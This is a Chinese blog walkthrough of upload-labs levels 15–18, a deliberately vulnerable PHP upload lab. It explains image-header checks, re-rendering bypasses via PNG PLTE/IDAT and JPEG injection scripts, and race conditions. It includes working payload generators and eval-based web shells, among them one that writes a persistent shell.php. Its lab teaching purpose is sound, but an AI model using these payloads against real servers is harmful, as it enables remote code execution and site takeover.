---
layout:     post               # 使用的布局（不需要改）
title:      upload-labs下    # 标题 
subtitle:       #副标题
date:       2020-07-12         # 时间
author:     yanmie             # 作者
header-img: img/.jpg    ##标签这篇文章标题背景图片
catalog: true                       # 是否归档
tags:                               
    - upload-labs
  
---

## Pass-15

	function isImage($filename){
    	//需要开启php_exif模块
    	$image_type = exif_imagetype($filename);
    	switch ($image_type) {
    	    case IMAGETYPE_GIF:
    	        return "gif";
    	        break;
    	    case IMAGETYPE_JPEG:
    	        return "jpg";
    	        break;
    	    case IMAGETYPE_PNG:
    	        return "png";
    	        break;    
    	    default:
    	        return false;
    	        break;
    	}
	}

	$is_upload = false;
	$msg = null;
	if(isset($_POST['submit'])){
	    $temp_file = $_FILES['upload_file']['tmp_name'];
	    $res = isImage($temp_file);
	    if(!$res){
	        $msg = "文件未知，上传失败！";
	    }else{
	        $img_path = UPLOAD_PATH."/".rand(10, 99).date("YmdHis").".".$res;
	        if(move_uploaded_file($temp_file,$img_path)){
	            $is_upload = true;
	        } else {
	            $msg = "上传出错！";
	        }
	    }
	}

`exif_imagetype()` 读取一个图像的第一个字节并检查其签名。 如果发现了恰当的签名则返回一个对应的常量，否则返回 FALSE。返回值和 getimagesize() 返回的数组中的索引 2 的值是一样的，但本函数快得多。 

这关和上关一样，直接制作图片吗上传就可以啦。

## Pass-16

	$is_upload = false;
	$msg = null;
	if (isset($_POST['submit'])){
	    // 获得上传文件的基本信息，文件名，类型，大小，临时文件	路径
	    $filename = $_FILES['upload_file']['name'];
	    $filetype = $_FILES['upload_file']['type'];
	    $tmpname = $_FILES['upload_file']['tmp_name'];

	    $target_path=UPLOAD_PATH.basename($filename);

	    // 获得上传文件的扩展名
	    $fileext= substr(strrchr($filename,"."),1);

	    //判断文件后缀与类型，合法才进行上传操作
	    if(($fileext == "jpg") && ($filetype=="image/	jpeg")){
	        if(move_uploaded_file($tmpname,$target_path))
	        {
	            //使用上传的图片生成新的图片
	            $im = imagecreatefromjpeg($target_path);

	            if($im == false){
	                $msg = "该文件不是jpg格式的图片！";
	                @unlink($target_path);
	            }else{
	                //给新图片指定文件名
	                srand(time());
	                $newfilename = strval(rand()).".jpg";
	                $newimagepath = UPLOAD_PATH.$newfilename;
                	imagejpeg($im,$newimagepath);
                	//显示二次渲染后的图片（使用用户上传图片生成的新图片）
                	$img_path = UPLOAD_PATH.$newfilename;
                	@unlink($target_path);
                	$is_upload = true;
            	}
        	} else {
        	    $msg = "上传出错！";
        	}

    	}else if(($fileext == "png") && ($filetype=="image/png")){
        	if(move_uploaded_file($tmpname,$target_path))
        	{
        	    //使用上传的图片生成新的图片
        	    $im = imagecreatefrompng($target_path);

        	    if($im == false){
        	        $msg = "该文件不是png格式的图片！";
        	        @unlink($target_path);
        	    }else{
        	         //给新图片指定文件名
        	        srand(time());
        	        $newfilename = strval(rand()).".png";
        	        $newimagepath = UPLOAD_PATH.$newfilename;
        	        imagepng($im,$newimagepath);
        	        //显示二次渲染后的图片（使用用户上传图片生成的新图片）
        	        $img_path = UPLOAD_PATH.$newfilename;
        	        @unlink($target_path);
        	        $is_upload = true;               
        	    }
        	} else {
        	    $msg = "上传出错！";
        	}

    	}else if(($fileext == "gif") && ($filetype=="image/gif")){
        	if(move_uploaded_file($tmpname,$target_path))
        	{
        	    //使用上传的图片生成新的图片
        	    $im = imagecreatefromgif($target_path);
        	    if($im == false){
        	        $msg = "该文件不是gif格式的图片！";
        	        @unlink($target_path);
        	    }else{
        	        //给新图片指定文件名
        	        srand(time());
        	        $newfilename = strval(rand()).".gif";
        	        $newimagepath = UPLOAD_PATH.$newfilename;
                	imagegif($im,$newimagepath);
                	//显示二次渲染后的图片（使用用户上传图片生成的新图片）
                	$img_path = UPLOAD_PATH.$newfilename;
                	@unlink($target_path);
             	  	 $is_upload = true;
            	}
        	} else {
        	    $msg = "上传出错！";
        	}
    	}else{
        	$msg = "只允许上传后缀为.jpg|.png|.gif的图片文件！";
    	}
	}



`basename()` 函数返回路径中的文件名部分。

`imagecreatefromjpeg` — 由文件或 URL 创建一个新图象。成功后返回图象资源,失败后返回 FALSE 。

`unlink()` 函数删除文件。
若成功，则返回 true，失败则返回 false。

`strval()` — 获取变量的字符串值。

`imagejpeg` — 输出图象到浏览器或文件。

从代码里得到信息：这里判断了上传文件的后缀和Content-Type,然后再用imagecreatefrom[gif|png|jpg]函数判断是否是图片格式，如果不是则直接删除上传文件，如果是图片的话再用image[gif|png|jpg]函数对其进行二次渲染。

#### **gif上传**：


![U3VF39.png](https://s1.ax1x.com/2020/07/12/U3VF39.png)

上传图片可以上传成功，但是被做了二次渲染，此时并不能进行文件包含。

![U3VDvn.png](https://s1.ax1x.com/2020/07/12/U3VDvn.png)

![U3Va4g.png](https://s1.ax1x.com/2020/07/12/U3Va4g.png)

前后对比，发现数据少了好多，而且gif末端添加的马被去掉了，

**关于绕过gif的二次渲染,我们只需要找到渲染前后没有变化的位置,然后将php代码写进去,就可以成功上传带有php代码的图片了.**

我们这里利用burp的比较模块，来对比上传前和上传后那些部分是没变的。

![U313iq.png](https://s1.ax1x.com/2020/07/12/U313iq.png)

在没变的部分中加入php一句话，之后成功上传。

#### **png上传**

png的二次渲染的绕过并不能像gif那样简单.


这里写入IDAT数据块的方法进行上传马。(直接在winhex写入，会上传不了，估计是破坏了png结构吧。)



##### **png文件组成**

png图片由3个以上的数据块组成.

PNG定义了两种类型的数据块，一种是称为关键数据块(critical chunk)，这是标准的数据块，另一种叫做辅助数据块(ancillary chunks)，这是可选的数据块。关键数据块定义了3个标准数据块(IHDR,IDAT, IEND)，每个PNG文件都必须包含它们.

数据块结构

![U3rrtK.png](https://s1.ax1x.com/2020/07/12/U3rrtK.png)

CRC(cyclic redundancy check)域中的值是对Chunk Type Code域和Chunk Data域中的数据进行计算得到的。CRC具体算法定义在ISO 3309和ITU-T V.42中，其值按下面的CRC码生成多项式进行计算：

x32+x26+x23+x22+x16+x12+x11+x10+x8+x7+x5+x4+x2+x+1

##### **分析数据块**

* **IHDR**

数据块IHDR(header chunk)：它包含有PNG文件中存储的图像数据的基本信息，并要作为第一个数据块出现在PNG数据流中，而且一个PNG数据流中只能有一个文件头数据块。

文件头数据块由13字节组成，它的格式如下图所示。

![U3rc1e.png](https://s1.ax1x.com/2020/07/12/U3rc1e.png)

* **PLTE**

调色板PLTE数据块是辅助数据块,对于索引图像，调色板信息是必须的，调色板的颜色索引从0开始编号，然后是1、2……，调色板的颜色数不能超过色深中规定的颜色数（如图像色深为4的时候，调色板中的颜色数不可以超过2^4=16），否则，这将导致PNG图像不合法。

* **IDAT**

图像数据块IDAT(image data chunk)：它存储实际的数据，在数据流中可包含多个连续顺序的图像数据块。

IDAT存放着图像真正的数据信息，因此，如果能够了解IDAT的结构，我们就可以很方便的生成PNG图像

* **IEND**

图像结束数据IEND(image trailer chunk)：它用来标记PNG文件或者数据流已经结束，并且必须要放在文件的尾部。

如果我们仔细观察PNG文件，我们会发现，文件的结尾12个字符看起来总应该是这样的：

00 00 00 00 49 45 4E 44 AE 42 60 82

**写入php代码**

在网上找到了两种方式来制作绕过二次渲染的png木马.

##### **写入PLTE数据块**

php底层在对PLTE数据块验证的时候,主要进行了CRC校验.所以可以再chunk data域插入php代码,然后重新计算相应的crc值并修改即可.

这种方式只针对索引彩色图像的png图片才有效,在选取png图片时可根据IHDR数据块的color type辨别.`03`为索引彩色图像.

* 在PLTE数据块写入php代码.

![U3rH1g.png](https://s1.ax1x.com/2020/07/12/U3rH1g.png)

* 计算PLTE数据块的CRC

CRC脚本:

	import binascii
	import re

	png = open(r'2.png','rb')
	a = png.read()
	png.close()
	hexstr = binascii.b2a_hex(a)

	''' PLTE crc '''
	data =  '504c5445'+ re.findall('504c5445(.*?)49444154',hexstr)[0]
	crc = binascii.crc32(data[:-16].decode('hex')) & 0xffffffff
	print hex(crc)

运行结果：

526579b0

* 修改CRC值

![U3rxA0.png](https://s1.ax1x.com/2020/07/12/U3rxA0.png)

* 验证

将修改后的png图片上传后,下载到本地打开

![U3sC3F.png](https://s1.ax1x.com/2020/07/12/U3sC3F.png)

##### **写入IDAT数据块**

这里有国外大牛写的脚本,直接拿来运行即可.

	<?php
	$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
           0x66, 0x44, 0x50, 0x33);



	$img = imagecreatetruecolor(32, 32);

	for ($y = 0; $y < sizeof($p); $y += 3) {
   		$r = $p[$y];
   		$g = $p[$y+1];
   		$b = $p[$y+2];
   		$color = imagecolorallocate($img, $r, $g, $b);
   		imagesetpixel($img, round($y / 3), 0, $color);
	}

	imagepng($img,'./1.png');
	?>

运行后得到1.png.上传后下载到本地打开如下图。

![U3mL5T.png](https://s1.ax1x.com/2020/07/12/U3mL5T.png)‘

说明：“<?=”是PHP的一个短的开放式标签，是echo() 的快捷用法。

`<?=$_GET[0]($_POST[1]); ?>`相当于`<?php echo($_GET[0]($_POST[1]));?>`

这里我用了eval结果不行，以下是原因：

`$_GET[0]()`是一个可变函数，这意味着如果一个变量名后有圆括号，PHP 将寻找与变量的值同名的函数，并且尝试执行它。可变函数可以用来实现包括回调函数，函数表在内的一些用途。

* 可变函数不能用于例如 echo，print，unset()，isset()，empty()，include，require 以及类似的语言结构。需要使用自己的包装函数来将这些结构用作可变函数
* php手册上，eval note:因为是一个语言构造器而不是一个函数，不能被 可变函数 调用。
* 科普一下`call_user_func('assert', $_REQUEST['assert']);`,call_user_func — 把第一个参数作为回调函数调用


所以这个文件包含上传的png图片马，构造如图参数：

![U3aEJH.png](https://s1.ax1x.com/2020/07/12/U3aEJH.png)

#### **jpg上传**

这里也采用国外大牛编写的脚本jpg_payload.php.

	
```
<?php
    /*

    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().
    It is necessary that the size and quality of the initial image are the same as those of the processed image.

    1) Upload an arbitrary image via secured files upload script
    2) Save the processed image and launch:
    jpg_payload.php <jpg_name.jpg>

    In case of successful injection you will get a specially crafted image, which should be uploaded again.

    Since the most straightforward injection method is used, the following problems can occur:
    1) After the second processing the injected data may become partially corrupted.
    2) The jpg_payload.php script outputs "Something's wrong".
    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.

    Sergey Bobrov @Black2Fan.

    See also:
    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/

    */

    $miniPayload = "<?=phpinfo();?>";


    if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) {
        die('php-gd is not installed');
    }

    if(!isset($argv[1])) {
        die('php jpg_payload.php <jpg_name.jpg>');
    }

    set_error_handler("custom_error_handler");

    for($pad = 0; $pad < 1024; $pad++) {
        $nullbytePayloadSize = $pad;
        $dis = new DataInputStream($argv[1]);
        $outStream = file_get_contents($argv[1]);
        $extraBytes = 0;
        $correctImage = TRUE;

        if($dis->readShort() != 0xFFD8) {
            die('Incorrect SOI marker');
        }

        while((!$dis->eof()) && ($dis->readByte() == 0xFF)) {
            $marker = $dis->readByte();
            $size = $dis->readShort() - 2;
            $dis->skip($size);
            if($marker === 0xDA) {
                $startPos = $dis->seek();
                $outStreamTmp = 
                    substr($outStream, 0, $startPos) . 
                    $miniPayload . 
                    str_repeat("\0",$nullbytePayloadSize) . 
                    substr($outStream, $startPos);
                checkImage('_'.$argv[1], $outStreamTmp, TRUE);
                if($extraBytes !== 0) {
                    while((!$dis->eof())) {
                        if($dis->readByte() === 0xFF) {
                            if($dis->readByte !== 0x00) {
                                break;
                            }
                        }
                    }
                    $stopPos = $dis->seek() - 2;
                    $imageStreamSize = $stopPos - $startPos;
                    $outStream = 
                        substr($outStream, 0, $startPos) . 
                        $miniPayload . 
                        substr(
                            str_repeat("\0",$nullbytePayloadSize).
                                substr($outStream, $startPos, $imageStreamSize),
                            0,
                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . 
                                substr($outStream, $stopPos);
                } elseif($correctImage) {
                    $outStream = $outStreamTmp;
                } else {
                    break;
                }
                if(checkImage('payload_'.$argv[1], $outStream)) {
                    die('Success!');
                } else {
                    break;
                }
            }
        }
    }
    unlink('payload_'.$argv[1]);
    die('Something\'s wrong');

    function checkImage($filename, $data, $unlink = FALSE) {
        global $correctImage;
        file_put_contents($filename, $data);
        $correctImage = TRUE;
        imagecreatefromjpeg($filename);
        if($unlink)
            unlink($filename);
        return $correctImage;
    }

    function custom_error_handler($errno, $errstr, $errfile, $errline) {
        global $extraBytes, $correctImage;
        $correctImage = FALSE;
        if(preg_match('/(\d+) extraneous bytes before marker/', $errstr, $m)) {
            if(isset($m[1])) {
                $extraBytes = (int)$m[1];
            }
        }
    }

    class DataInputStream {
        private $binData;
        private $order;
        private $size;

        public function __construct($filename, $order = false, $fromString = false) {
            $this->binData = '';
            $this->order = $order;
            if(!$fromString) {
                if(!file_exists($filename) || !is_file($filename))
                    die('File not exists ['.$filename.']');
                $this->binData = file_get_contents($filename);
            } else {
                $this->binData = $filename;
            }
            $this->size = strlen($this->binData);
        }

        public function seek() {
            return ($this->size - strlen($this->binData));
        }

        public function skip($skip) {
            $this->binData = substr($this->binData, $skip);
        }

        public function readByte() {
            if($this->eof()) {
                die('End Of File');
            }
            $byte = substr($this->binData, 0, 1);
            $this->binData = substr($this->binData, 1);
            return ord($byte);
        }

        public function readShort() {
            if(strlen($this->binData) < 2) {
                die('End Of File');
            }
            $short = substr($this->binData, 0, 2);
            $this->binData = substr($this->binData, 2);
            if($this->order) {
                $short = (ord($short[1]) << 8) + ord($short[0]);
            } else {
                $short = (ord($short[0]) << 8) + ord($short[1]);
            }
            return $short;
        }

        public function eof() {
            return !$this->binData||(strlen($this->binData) === 0);
        }
    }
?>
```

使用方法:

##### **准备**

随便找一个jpg图片,先上传至服务器然后再下载到本地保存为`1.jpg`.

(linux环境下上传jpg文件出错了，所以在windows下的pass-17代替测试。)

##### **插入php代码**


使用脚本处理`1.jpg`,命令`php jpg_payload.php 1.jpg`


使用16进制编辑器打开,就可以看到插入的php代码.

##### **上传图片马**

将生成的payload_1.jpg上传.

这里出点小问题，待会再来。

解题方法转载于：[https://xz.aliyun.com/t/2657](https://xz.aliyun.com/t/2657)

## Pass-17

```
$is_upload = false;
$msg = null;

if(isset($_POST['submit'])){
    $ext_arr = array('jpg','png','gif');
    $file_name = $_FILES['upload_file']['name'];
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $file_ext = substr($file_name,strrpos($file_name,".")+1);
    $upload_file = UPLOAD_PATH . '/' . $file_name;

    if(move_uploaded_file($temp_file, $upload_file)){
        if(in_array($file_ext,$ext_arr)){
             $img_path = UPLOAD_PATH . '/'. rand(10, 99).date("YmdHis").".".$file_ext;
             rename($upload_file, $img_path);
             $is_upload = true;
        }else{
            $msg = "只允许上传.jpg|.png|.gif类型文件！";
            unlink($upload_file);
        }
    }else{
        $msg = '上传出错！';
    }
}
```

这里是先move_uploaded_file函数将上传文件临时保存，再进行判断，如果不在白名单里则unlink删除，在的话就rename重命名，所以这里存在条件竞争。

我们可以一直上传`ma.php`，然后一直访问`ma.php`,当访问的那一瞬间服务器还没删除马的时候，就可以访问到了。

**为了更好的演示效果，把一句话木马换一下改为：**

	<?php fputs(fopen('shell.php','w'),'<?php @eval($_POST["pass17"])?>');?>

我们利用burp不断的进行上传与访问，总会有那么一瞬间是还没来得及删除就可以被访问到的，一旦访问到该文件就会在当前目录下生成一个shell.php的一句话。在正常的渗透测试中这也是个好办法。因为单纯的去访问带有phpinfo()的文件并没有什么卵用。一旦删除了还是无法利用。但是这个办法生成的shell.php服务器是不会删除的，

我们抓包，放到`intruder`模块，

![U3jYOH.png](https://s1.ax1x.com/2020/07/12/U3jYOH.png)

设置`payloads`为`Null payloads`(即无payload),设置无限上传，（上面这个可以设置自定义次数）

![U3jnm9.png](https://s1.ax1x.com/2020/07/12/U3jnm9.png)

线程在`options`设置为10.

抓包`访问ma.php的页面`，同样设置为访问5000次，20线程。

![U3jjtx.png](https://s1.ax1x.com/2020/07/12/U3jjtx.png)

有返回`200状态码`的值，

![U3vujg.png](https://s1.ax1x.com/2020/07/12/U3vujg.png)

访问`http://192.168.2.222:81/upload/shell.php`,(脑子抽经了，改包是改的密码时paaa17.....)

![U3vo5t.png](https://s1.ax1x.com/2020/07/12/U3vo5t.png)

## Pass-18

代码审计：

```
//index.php
$is_upload = false;
$msg = null;
if (isset($_POST['submit']))
{
    require_once("./myupload.php");
    $imgFileName =time();
    $u = new MyUpload($_FILES['upload_file']['name'], $_FILES['upload_file']['tmp_name'], $_FILES['upload_file']['size'],$imgFileName);
    $status_code = $u->upload(UPLOAD_PATH);
    switch ($status_code) {
        case 1:
            $is_upload = true;
            $img_path = $u->cls_upload_dir . $u->cls_file_rename_to;
            break;
        case 2:
            $msg = '文件已经被上传，但没有重命名。';
            break; 
        case -1:
            $msg = '这个文件不能上传到服务器的临时文件存储目录。';
            break; 
        case -2:
            $msg = '上传失败，上传目录不可写。';
            break; 
        case -3:
            $msg = '上传失败，无法上传该类型文件。';
            break; 
        case -4:
            $msg = '上传失败，上传的文件过大。';
            break; 
        case -5:
            $msg = '上传失败，服务器已经存在相同名称文件。';
            break; 
        case -6:
            $msg = '文件无法上传，文件不能复制到目标目录。';
            break;      
        default:
            $msg = '未知错误！';
            break;
    }
}

//myupload.php
class MyUpload{
......
......
...... 
  var $cls_arr_ext_accepted = array(
      ".doc", ".xls", ".txt", ".pdf", ".gif", ".jpg", ".zip", ".rar", ".7z",".ppt",
      ".html", ".xml", ".tiff", ".jpeg", ".png" );

......
......
......  
  /** upload()
   **
   ** Method to upload the file.
   ** This is the only method to call outside the class.
   ** @para String name of directory we upload to
   ** @returns void
  **/
  function upload( $dir ){
    
    $ret = $this->isUploadedFile();
    
    if( $ret != 1 ){
      return $this->resultUpload( $ret );
    }

    $ret = $this->setDir( $dir );
    if( $ret != 1 ){
      return $this->resultUpload( $ret );
    }

    $ret = $this->checkExtension();
    if( $ret != 1 ){
      return $this->resultUpload( $ret );
    }

    $ret = $this->checkSize();
    if( $ret != 1 ){
      return $this->resultUpload( $ret );    
    }
    
    // if flag to check if the file exists is set to 1
    
    if( $this->cls_file_exists == 1 ){
      
      $ret = $this->checkFileExists();
      if( $ret != 1 ){
        return $this->resultUpload( $ret );    
      }
    }

    // if we are here, we are ready to move the file to destination

    $ret = $this->move();
    if( $ret != 1 ){
      return $this->resultUpload( $ret );    
    }

    // check if we need to rename the file

    if( $this->cls_rename_file == 1 ){
      $ret = $this->renameFile();
      if( $ret != 1 ){
        return $this->resultUpload( $ret );    
      }
    }
    
    // if we are here, everything worked as planned :)

    return $this->resultUpload( "SUCCESS" );
  
  }
......
......
...... 
};
```


这里一眼看到

![U8aha8.png](https://s1.ax1x.com/2020/07/12/U8aha8.png)

先先移动文件，后重命名，所以我们我也可以利用条件竞争，在没有重命名之前将它访问到。

而这里用到了白名单验证，肯定是上传不了php后缀的，但我们看到有个`7z`后缀，是apache无法解析的，所以可以利用apache解析漏洞(nginx也可以)配合条件竞争上传。